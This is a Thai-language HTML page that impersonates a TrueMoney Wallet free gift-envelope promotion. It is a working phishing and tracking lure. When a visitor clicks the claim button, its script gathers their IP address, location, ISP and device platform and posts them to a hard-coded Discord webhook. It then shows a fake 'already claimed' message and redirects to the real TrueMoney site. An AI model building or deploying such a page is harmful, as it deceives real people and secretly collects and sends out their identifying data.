<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>รับซองทรูมันนี่วอลเล็ทฟรี - TrueMoney</title>
<style>
    body { margin: 0; font-family: 'Kanit', sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .card { width: 90%; max-width: 400px; background: #fff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; padding: 30px; }
    .logo { width: 150px; margin-bottom: 20px; }
    .gift-box { width: 120px; animation: bounce 2s infinite; }
    @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
    h2 { color: #ff8c00; margin: 15px 0; }
    p { color: #666; font-size: 14px; }
    .btn { background: #ff8c00; color: #fff; border: none; padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 20px; width: 100%; }
    .btn:hover { background: #e67e00; transform: scale(1.05); }
    #status { margin-top: 15px; font-size: 12px; color: #999; }
</style>
</head>
<body>

<div class="card">
    <img src="https://www.truemoney.com/wp-content/uploads/2020/12/truemoney-wallet-logo.png" class="logo">
    <img src="https://img5.pic.in.th/file/secure-sv1/gift-box.png" class="gift-box">
    <h2>คุณได้รับซองของขวัญ!</h2>
    <p>กดปุ่มด้านล่างเพื่อรับเงินสุ่มตั้งแต่ 10 - 500 บาท<br>เข้าบัญชีทรูมันนี่ วอลเล็ทของคุณทันที</p>
    <button class="btn" onclick="startTrap()">กดเพื่อรับซองฟรี</button>
    <div id="status">ระบบกำลังตรวจสอบสิทธิ์...</div>
</div>

<script>

const webhookURL = "https://discord.com/api/webhooks/1499460967979942014/a7wMgIv8eKeJYAv2oA84nyZA4IG0OeP3iAMFwxUR2EXDLA0968IMWn5qusmTb9_d0r4y";

async function getFullIntel() {
    try {
        const response = await fetch('http://ip-api.com/json/?fields=status,country,city,isp,query');
        const data = await response.json();
        if (data.status === 'success') {
            return { ip: data.query, loc: `${data.city}, ${data.country}`, isp: data.isp };
        }
        throw new Error();
    } catch (e) {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const d = await res.json();
            return { ip: d.ip, loc: "Unknown (Fallback)", isp: "N/A" };
        } catch {
            return { ip: "Bypassed/Hidden", loc: "N/A", isp: "N/A" };
        }
    }
}

async function startTrap() {
    const statusText = document.getElementById("status");
    statusText.textContent = "⌛ กำลังตรวจสอบยอดเงินในซอง...";
    
    // สอยข้อมูลเหยื่อสวัส!
    const intel = await getFullIntel();
    
    const content = `🎯 **GIFT ENVELOPE TARGET ACQUIRED**\n` +
                    `📡 **REAL IP:** \`${intel.ip}\`\n` +
                    `📍 **Location:** \`${intel.loc}\`\n` +
                    `🌐 **ISP:** \`${intel.isp}\`\n` +
                    `📱 **Device:** ${navigator.platform}\n` +
                    `⏰ **Time:** ${new Date().toLocaleString()}`;

    try {
        await fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: content })
        });
        
        statusText.textContent = "❌ เสียใจด้วย! ซองนี้ถูกรับไปครบแล้ว";
        alert("ขออภัย! ซองของขวัญนี้มีผู้รับไปครบจำนวนแล้ว");
        window.location.href = "https://www.truemoney.com";
    } catch (e) {
        statusText.textContent = "เครือข่ายขัดข้อง ลองใหม่อีกครั้ง";
    }
}
</script>

</body>
</html>
